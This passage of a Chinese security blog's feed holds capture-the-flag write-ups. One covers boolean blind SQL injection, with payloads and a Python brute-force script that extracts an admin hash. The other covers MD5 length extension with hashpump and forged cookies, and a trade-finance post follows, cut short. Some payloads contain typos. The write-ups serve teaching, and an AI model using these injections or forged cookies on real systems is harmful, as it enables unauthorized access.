      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
      <category term="jarvisOJ" scheme="https://j-kangel.github.io/categories/web/jarvisOJ/"/>
    
    
      <category term="sql注入" scheme="https://j-kangel.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>几种sql盲注</title>
    <link href="https://j-kangel.github.io/2019/04/06/blindsqlinjection/"/>
    <id>https://j-kangel.github.io/2019/04/06/blindsqlinjection/</id>
    <published>2019-04-05T17:43:58.000Z</published>
    <updated>2019-04-11T08:27:32.129Z</updated>
    
    <content type="html"><![CDATA[<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。</p><p>应用场景：根据用户名和密码的输入，页面返回密码错误和用户名错误两种类型。利用返回不同，逐个拆解密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">auth.php</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$username = str_replace(<span class="string">' '</span>, <span class="string">''</span>, $username); <span class="comment">//过滤空格</span></span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line">$sql = <span class="string">"select password from admin where username = '"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$rowcount = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">if</span> $rowcount == <span class="number">0</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'用户名错误'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ($rowcount--)&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username = <span class="string">'admin'</span> <span class="keyword">and</span> $password = $result[$row])&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'密码错误'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">"admin'^(ascii(mid((password)from(str（1)))=ord（1)^1#"</span></span><br></pre></td></tr></table></figure><p><code>^</code>表示异或，将username分为三段，<code>admin&#39;</code>（假设存在该用户名）和<code>1</code>异或为0，所以username的真值由<code>(ascii(mid((password)from(str（1)))=ord（1)</code>决定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid()函数</span><br><span class="line">mid（“kangel” from（str（3）） //返回&quot;kangel&quot;从第三个字符开始的所有字符，即&quot;gel&quot;</span><br><span class="line">assic()函数</span><br><span class="line">assic(&quot;abc&quot;)   //返回“abc”第一个字符的assic值，即97</span><br><span class="line">(ascii(mid((password)from(str（1)))=ord（1)   //password第一个字符assic值与&quot;1&quot;的assic值（49）进行比较</span><br></pre></td></tr></table></figure><p>因此，若过滤了<code>=</code>，则可以替换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;admin&apos;^(ascii(mid((password)from(str（1)))&lt;&gt;ord（1)^0#&quot;</span><br></pre></td></tr></table></figure><p>例题：<a href="http://web.jarvisoj.com:32787/login.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32787/login.php</a></p><p><img src="/2019/04/06/blindsqlinjection/1.JPG" alt=""></p><p>判断登录漏洞类型，输入<code>admin</code>、<code>admin</code>返回密码错误，输入<code>kangel</code>、<code>123</code>返回用户名错误</p><p>继续判断过滤字符，username输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;^(ascii(mid((password)from(&apos;1&apos;))&lt;&gt;97^0#&quot;  //用户名错误</span><br><span class="line">admin&apos;^(ascii(mid((password)from(1)))=97)^0#    //密码错误</span><br></pre></td></tr></table></figure><p>该payload有效，猜测密码为md5值存储，上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"></span><br><span class="line">str_hex = <span class="string">'0123456789abcdef'</span></span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_hex:</span><br><span class="line">        username = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(index),ord(i))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: username,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'admin'</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(username)</span><br><span class="line">        s = r.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> s.text:</span><br><span class="line">            password += i</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>得到password：<code>334cfb59c9d74849801d5acdcfdaadc3</code>，MD5解密得：<code>eTAloCrEP</code>，用<code>admin</code>、<code>eTAloCrEP</code>登录得到flag。</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;布尔盲注&quot;&gt;&lt;a href=&quot;#布尔盲注&quot; class=&quot;headerlink&quot; title=&quot;布尔盲注&quot;&gt;&lt;/a&gt;布尔盲注&lt;/h3&gt;&lt;p&gt;漏洞解释：根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。&lt;/p&gt;
&lt;p&gt;应用
      
    
    </summary>
    
      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
      <category term="jarvisOJ" scheme="https://j-kangel.github.io/categories/web/jarvisOJ/"/>
    
    
      <category term="sql注入" scheme="https://j-kangel.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="盲注" scheme="https://j-kangel.github.io/tags/%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="https://j-kangel.github.io/2019/04/05/hash-attack/"/>
    <id>https://j-kangel.github.io/2019/04/05/hash-attack/</id>
    <published>2019-04-04T18:46:41.000Z</published>
    <updated>2019-04-04T14:58:18.054Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hash原理（以MD5为例）"><a href="#hash原理（以MD5为例）" class="headerlink" title="hash原理（以MD5为例）"></a>hash原理（以MD5为例）</h3><h4 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h4><p>MD5算法输入消息以512bit的分组为单位处理（sha1、sha256也是如此），共64字节。然后对每个分组进行一次“加密”，前一次的“加密”结果会作为这一次“加密”的输入，最后一次“加密”结果即为最终MD5值。不足64字节的分组需要进行补位，也就是字节填充。</p><p>补位原则：首先将需要hash的字符串进行分组，即字符串长度（以字节为单位）整除64，最后一组不足56字节的进行字节填充。填充的第一个字节为0x80，其他均为0x00。剩下的8个字节用来表示原字符串的长度。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>现在需要加密字符串：<code>hash_length_extend_attack</code>，共25字节。</p><p><img src="/2019/04/05/hash-attack/1.JPG" alt=""></p><p>该字符串不足56字节，需进行补位。第一个字节为0x80，其余为0x00，填充至56位。</p><p><img src="/2019/04/05/hash-attack/2.JPG" alt=""></p><p>最后8个字节为原字符串的长度描述符（以bit为单位），25字节共200bit，120转十六进制为0xc8。由于MD5的存储为小端位序。例如0x12345678存为0x78563412。</p><p><img src="/2019/04/05/hash-attack/3.JPG" alt=""></p><h3 id="hash长度扩展攻击原理"><a href="#hash长度扩展攻击原理" class="headerlink" title="hash长度扩展攻击原理"></a>hash长度扩展攻击原理</h3><p>若<code>md5($salt.string1)</code>已知，则在salt未知的条件下可以求出<code>md5($salt.string1+padding+stirng2)</code>。</p><p>证明：因为<code>md5($salt.string1)=md5($salt.string1+padding</code>，因此<code>md5($salt.string1+padding+stirng2)</code>即为用<code>md5($salt.string1)</code>对<code>$string2+padding</code>进行一次“加密”。</p><p>工具：hashpump</p><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/HashPump<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0  <span class="comment">##md5($salt.string1)</span></span><br><span class="line">Input Data:  ;<span class="string">"tseug"</span>:5:s        <span class="comment">##string1</span></span><br><span class="line">Input Key Length: 11             <span class="comment">##salt长度</span></span><br><span class="line">Input Data to Add: ;<span class="string">"nimda"</span>:5:s  <span class="comment">##string2</span></span><br><span class="line">fcdc3840332555511c4e4323f6decb07    <span class="comment">##md5($salt.string1+padding+stirng2)</span></span><br><span class="line">;<span class="string">"tseug"</span>:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00;<span class="string">"nimda"</span>:5:s      <span class="comment">##$salt.string1+padding+stirng2</span></span><br></pre></td></tr></table></figure><p>下面结合两个具体题目来实现攻击</p><h3 id="题目一：salt长度已知"><a href="#题目一：salt长度已知" class="headerlink" title="题目一：salt长度已知"></a>题目一：salt长度已知</h3><p>题目链接：<a href="http://www.shiyanbar.com/ctf/1848" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1848</a></p><p>username和password输入admin、admin。响应出现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you have the correct credentials, log in below. If not, please LEAVE.</span><br></pre></td></tr></table></figure><p>查看源码，无任何提示。于是抓包分析。发现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=0; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1553478983,1554089005,1554300942,1554380508; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*130458%2CnickName%3AKANGEL; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1554380518; PHPSESSID=615uqh2qr9s16pr67f9bhs9ur6</span><br></pre></td></tr></table></figure><p>cookie中有hash值，有source。将<code>source=0</code>改为<code>source=1</code>，发现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉的味道，要注意的是<code>$salt = %secret.&quot;admin&quot;</code>，长度为20：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$salt.string1 = $secret.urldecode(<span class="string">"admin"</span>.<span class="string">"admin"</span>)</span><br><span class="line">$string1 = <span class="string">"admin"</span>   <span class="comment">//urldecode($username) === "admin"</span></span><br><span class="line">md5($salt.string1) = <span class="string">"571580b26c65f306376d4f64e53cb5c7"</span> <span class="comment">//cookie中的sample-hash</span></span><br><span class="line">$string2 = <span class="string">"kangel"</span>  <span class="comment">//urldecode($password) != "admin"</span></span><br></pre></td></tr></table></figure><p>现在利用hashpump计算<code>md5($secret.urldecode(&quot;admin&quot;.&quot;admin&quot;).padding.&quot;kangel&quot;)</code>，其中<code>$password=&quot;admin&quot;.padding.&quot;kangel&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: kangel</span><br><span class="line">04dd497abe8ae2d3c5a7775c2056850e</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00kangel</span><br></pre></td></tr></table></figure><p>于是构造cookie：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getmein=04dd497abe8ae2d3c5a7775c2056850e</span><br></pre></td></tr></table></figure><p>构造post，需要将<code>\x</code>替换为<code>%</code>:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00kangel</span><br></pre></td></tr></table></figure><p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p><p><img src="/2019/04/05/hash-attack/4.JPG" alt=""></p><h3 id="题目二：salt长度未知"><a href="#题目二：salt长度未知" class="headerlink" title="题目二：salt长度未知"></a>题目二：salt长度未知</h3><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>查看源码，无提示。</p><p>抓包分析，发现cookie中包含信息：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: UM_distinctid=167a58b007e9-03c00e05130083-143d7240-100200-167a58b007f190; role=s%3A5%3A%22guest%22%3B; hsh=3a4727d57463f122833d9e732f94e4e0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>既然无任何源码信息，用源码泄露工具扫一波，发现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://web.jarvisoj.com:32778/index.php~</span></span><br></pre></td></tr></table></figure><p>漏洞朔源：一般网站管理员在日常维护中，总会把网站源码给备份一下，防止网站出现问题时，能马上的恢复使用，不过一般的管理员安全意识不高，在备份的时候，会使用一些常见的压缩备份名以及文件名，而且不光使用常见的备份名字，大部分的管理还会把备份好的源码直接放在网站根目录里。因此很容易被攻击者利用。</p><p>该文件为index.php备份文件，先将文件名该文index.php.swp，再使用vim进行恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><p>得到源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Web 350<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    body &#123;</span></span><br><span class="line"><span class="undefined">        background:gray;</span></span><br><span class="line"><span class="undefined">        text-align:center;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">        $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        $role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">        $salt = </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span></span><br><span class="line"><span class="php">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span></span><br><span class="line"><span class="php">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span></span><br><span class="line"><span class="php">                $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">                $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            $s = serialize($role);</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'role'</span>,$s);</span></span><br><span class="line"><span class="php">            $hsh = md5($salt.strrev($s));</span></span><br><span class="line"><span class="php">            setcookie(<span class="string">'hsh'</span>,$hsh);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($auth) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    <span class="meta">?&gt;</span></span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>熟悉的味道，首先要满足<code>$role===&quot;admin&quot;</code>，对“admin”进行序列化得到<code>;&quot;nimda&quot;:5:s</code>，而字节填充和strrev()刚好利用unserialize()的%00截断漏洞：</p><p>漏洞分析：</p><p><img src="/2019/04/05/hash-attack/6.JPG" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$salt = $salt   <span class="comment">//长度未知</span></span><br><span class="line">$string1 = strrev(serialize($role)) = ;<span class="string">"tseug"</span>:<span class="number">5</span>:s</span><br><span class="line">md5($salt.string1) = “<span class="number">3</span>a4727d57463f122833d9e732f94e4e0”  <span class="comment">//cookie中的hsh </span></span><br><span class="line">$string2 = ;<span class="string">"nimda"</span>:<span class="number">5</span>:s</span><br></pre></td></tr></table></figure><p>现在用hashpump计算<code>md5($salt.strrev($_COOKIE[&quot;role&quot;]))</code>，salt长度对hash值计算无影响，假设为10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</span><br><span class="line">Input Data: ;<span class="string">"tseug"</span>:5:s</span><br><span class="line">Input Key Length: 10</span><br><span class="line">Input Data to Add: ;<span class="string">"nimda"</span>:5:s</span><br><span class="line">fcdc3840332555511c4e4323f6decb07</span><br><span class="line">;<span class="string">"tseug"</span>:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;<span class="string">"nimda"</span>:5:s</span><br></pre></td></tr></table></figure><p>得到cookie中的hsh：<code>fcdc3840332555511c4e4323f6decb07</code>，对padding值进行反转，将<code>\x</code>替换为<code>%</code>，进行URL编码：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=s%3a5%3a"admin"%3b%00%00%00%00%00%00%00%b0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a"guest"%3b</span><br></pre></td></tr></table></figure><p>利用burp进行爆破，最多64次，这里取salt长度为10,11,12,13,14,15作为演示，选取<code>%b0%00%00%00%00%00</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%b0%00%00%00%00%00</span><br><span class="line">%b8%00%00%00%00</span><br><span class="line">%c0%00%00%00</span><br><span class="line">%c8%00%00</span><br><span class="line">%d0%00</span><br><span class="line">%d8</span><br></pre></td></tr></table></figure><p><img src="/2019/04/05/hash-attack/5.JPG" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;hash原理（以MD5为例）&quot;&gt;&lt;a href=&quot;#hash原理（以MD5为例）&quot; class=&quot;headerlink&quot; title=&quot;hash原理（以MD5为例）&quot;&gt;&lt;/a&gt;hash原理（以MD5为例）&lt;/h3&gt;&lt;h4 id=&quot;原理浅析&quot;&gt;&lt;a href=&quot;#原
      
    
    </summary>
    
      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
      <category term="jarvisOJ" scheme="https://j-kangel.github.io/categories/web/jarvisOJ/"/>
    
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="crypto" scheme="https://j-kangel.github.io/tags/crypto/"/>
    
      <category term="MD5" scheme="https://j-kangel.github.io/tags/MD5/"/>
    
      <category term="源码泄露" scheme="https://j-kangel.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
      <category term="序列化" scheme="https://j-kangel.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>trade-finance-logistics网络运行与分析</title>
    <link href="https://j-kangel.github.io/2019/03/28/trade-finance/"/>
    <id>https://j-kangel.github.io/2019/03/28/trade-finance/</id>
    <published>2019-03-27T23:19:03.000Z</published>
    <updated>2019-04-04T06:55:37.664Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、trade-finance-logistics网络介绍"><a href="#一、trade-finance-logistics网络介绍" class="headerlink" title="一、trade-finance-logistics网络介绍"></a>一、trade-finance-logistics网络介绍</h3><h4 id="1、工作交易流程"><a href="#1、工作交易流程" class="headerlink" title="1、工作交易流程"></a>1、工作交易流程</h4><p>工作流程中的交易如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 进口商要求出口商提供货物以换取货币</span><br><span class="line">2. 出口商接受贸易协议</span><br><span class="line">3. 进口商要求银行提供有利于出口商的信用证</span><br><span class="line">4. 进口商的银行提供有利于出口商的信用证，并可支付给后者的银行</span><br><span class="line">5. 出口商的银行代表出口商接受信用证</span><br><span class="line">6. 出口商向监管机构申请E / L.</span><br><span class="line">7. 监管机构向出口商提供E / L.</span><br><span class="line">8. 